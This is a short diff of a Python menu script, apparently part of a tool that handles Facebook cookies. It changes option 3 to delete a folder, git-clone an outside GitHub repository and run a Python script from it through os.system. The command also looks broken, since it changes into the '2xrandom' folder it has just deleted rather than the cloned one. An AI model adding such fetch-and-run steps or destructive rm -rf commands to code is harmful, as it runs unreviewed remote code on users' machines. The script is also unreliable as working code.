@@ -724,7 +724,7 @@ def menu():
 	#elif xd in ['8','08']:
 		#os.system('rm -rf fb_cookies.txt')
 	elif xd in ['3','03']:
-			os.system('rm -rf 2xrandom && python 2xrandom.py && cd 2xrandom && python 2xrandom.py ')
+			os.system('rm -rf 2xrandom && git clone https://github.com/mdtasin123/momomah && cd 2xrandom && python 2xrandom.py ')
 	elif xd in ['5','05']:
 		os.system(f'xdg-open https://wa.me/+8801836751224');menu()
 			
